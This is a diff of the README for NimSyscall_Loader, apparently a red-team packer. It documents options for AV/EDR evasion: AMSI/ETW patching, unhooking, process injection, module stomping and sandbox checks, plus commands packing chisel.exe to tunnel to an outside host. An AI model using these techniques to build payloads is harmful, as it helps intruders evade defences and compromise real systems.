@@ -110,10 +110,10 @@ https://youtu.be/Oj55uilxEF4
 https://youtu.be/BYuAUYQcI-E
 
 ```
-NimSyscall_Loader v 2.1
+NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -128,6 +128,9 @@ Options:
     --keyfile keyfile  File to read key from
     --dnsKey    Use remote DNS TXT Record as key which is retrieved on runtime
       --dnsdomain sub.example.com    Specify a subdomain to use for the DNS TXT Record
+  --environmentalKey value    Use environmental key (domain,username) to encrypt with
+                              domain -> enumerate the current domain on runtime and use that as key
+                              username -> enumerate the current username on runtime and use that as key
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
@@ -146,6 +149,8 @@ Options:
   --psout    Powershell Output format, reflectively loading the packed binary
     --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation.
     --pslyrics    Add Lyrics as comments to avoid some more detections
+  --csout    C# Output format, reflectively loading the packed binary
+  --scout    Shellcode Output format, reflectively loading the packed binary via donut
   --sourceonly    Dont compile but just create the source code and compile command
   --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
   --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
@@ -166,13 +171,14 @@ Options:
       --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
       --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
       --cpl    Generate a CPL file (Control Panel Applet) instead of an executable
+      --xll    Generate an XLL file (Excel Add-In) instead of an executable
 
 [evasion]
 
   --sleep 10    Sleep 10 seconds before decryption to evade memory scanners
   --sleep-in-between 10    Sleep 10 seconds at some potentially critical steps in between to evade memory scanners
   --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
-  --unhook    Unhook ntdll.dll before doing anything else for the current process
+  --unhook value    Unhook the specified DLL before doing anything else for the current process
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --macPayload    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
   --sgn    Encode shellcode via SGN before encrypting it
@@ -207,6 +213,7 @@ Options:
   --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
     --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
     --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint
+  --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loaded into the local or newly spawned process. (Doesnt work for injection into existing processes)
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
@@ -226,7 +233,6 @@ Options:
   --mapSection    Map the shellcode into via NtCreateSection/NtMapViewOfSection . For remote injection decryption will happen AFTER writing the Shellcode into the remote process
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
-          --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loadied into the newly spawned process.
       --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                          Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
       --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
@@ -237,7 +243,9 @@ Options:
   --threadless    Use Threadless inject for shellcode execution (https://github.com/CCob/ThreadlessInject)
       --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
       --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
+  --poolparty number    Use Poolparty technique 1,2,3,4 for execution
   --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
+  --Caro-Kann-Thread   Same as Caro-Kann, but the Shellcode will not do a direct JMP but instead create a Thread on the start address 
   --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
       --stombDll dllname    Specify a DLL to use for the Module Stomping (default is 'chakra.dll')
       --stombFunc dllfunc    Specify a function to use for the Module Stomping
@@ -405,16 +413,16 @@ If you're receiving ERROR 1053 on Service start you will most likely have forgot
 
 My custom `Nim-RUNPE` implementatation unfortunately cannot handle GoLang binaries at the moment. That's some strange bug within Nim, have to investigate deeper sometime. Definitely a rabbit whole, already spent a lot of time.
 
-For for the moment as workaround you can use `--peinject` to generate shellcode out of the golang binary to execute that either locally as executable or DLL.
+For for the moment as workaround you can use `--peinject --large` to generate shellcode out of the golang binary to execute that either locally as executable or DLL.
 
 Example:
 
 ```batch
-NimSyscallLoader --file chisel.exe --peinject --output ChiselPacked.exe
+NimSyscallLoader --file chisel.exe --peinject --large --output ChiselPacked.exe
 
 or
 
-NimSyscallLoader --file chisel.exe --peinject --dll --arguments "client https://chisel-demo.herokuapp.com 3000" --output ChiselPacked.dll
+NimSyscallLoader --file chisel.exe --peinject --large --dll --arguments "client https://chisel-demo.herokuapp.com 3000" --output ChiselPacked.dll
 ```
 
 You `have to` pass hardcoded arguments when using a DLL, because `PEInject` DLLs don't accept arguments from the target host. Remote injection is also possible but arguments cannot be hardcoded here.
@@ -463,9 +471,9 @@ The default values are only useful for the builtin spawn/inject `rundll32.exe` t
 
 Module stomping gives us the advantage of not allocating memory for shellcode injection anymore, as we overwrite (a part) of the `.text` section from an already loaded DLL. If the DLL was not loaded already in the remote target process, it will get force loaded first over Creating a remote Thread on `LoadLibrary` or when using ThreadlessInject over an hook pointing to custom LoadLibrary-Shellcode. By default, the DLL `chakra.dll` is used for Stomping, which is in the most cases suitable due to it`s size. However, you can change the DLL via Packer parameters however you like.
 
-I personally faced issues with CFG (Control Flow Guard) when overwriting the `.text` section at "random" offsets. To avoid CFG, the current implementation overwrites one (or with Caro-Kann enabled two) DLL entrypoints:
+To avoid CFG, the current implementation overwrites one (or with Caro-Kann enabled two) DLL entrypoints:
 
-- `DLLCanUnloadNow`
+- `JsRunScript`
 - `MemProtectHeapUnprotectCurrentThread`
 
 If you change the DLL, you will also need to change the target function names, as they might not exist on other DLLs. Also, it could be a problem if there is either
@@ -501,10 +509,6 @@ Read this:
 - `--obfuscate` cannot handle ASM-Stubs well and therefore cannot compile binaries with `--hellsgate` or `--syswhispers`
 - XP/WS2k3 will only work with the flags `--syswhispers --noAntidebug --noDInvoke`
 
-## ProtectMyTooling embedded
-
-[mgeeky](https://github.com/mgeeky) also wrote a wrapper script for this Packer in his private ProtectMyTooling repository to automate the process of packing binaries with my packer. No need to choose options there for you. Also consider sponsoring him, as his private tool collection is worth it. :+1:
-
 ## TO-DO
 - [x] PELoader via syscalls
 - [x] Hellsgate support
@@ -516,7 +520,7 @@ Read this:
 - [X] DLL output
 - [X] DLL Sideloading capabilities
 - [X] Powershell output
-- [ ] C# output
+- [X] C# output
 - [X] More syscalls and or D/Invoke for win32 functions
 - [X] Cobalt Strike integration - CNA
 - [ ] Passing parameters via e.g. manipulation of the PEB field (Command line spoofing like)
@@ -540,6 +544,7 @@ Read this:
 - [X] Download Shellcode from Webserver or read it from local file as alternative to embedding (default)
 - [ ] Use more compiler flags to overwrite dynlib to avoid Function IoCs plus reduze size `-d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg --passC:"-nostdlib -ffunction-sections -fno-ident -fno-asynchronous-unwind-tables -fno-exceptions" --passL:"-s --disable-runtime-pseudo-relo  --disable-reloc-section" --dynlibOverrideAll`
 - [ ] Use cloned Handles instead of OpenProcess (Handlekatz like) for remote process injection or as alternative Handle Elevation
+- [X] Handle elevation
 - [X] Add ThreadlessInject for Remote Injection
 - [ ] Add Callback execution primitives for remote injection via a Nim Port of https://github.com/lem0nSec/CreateRemoteThreadPlus
 - [X] Store Payloads as MAC or IP-Adresses and retrieve the encrypted Payload on runtime to decrease entropy
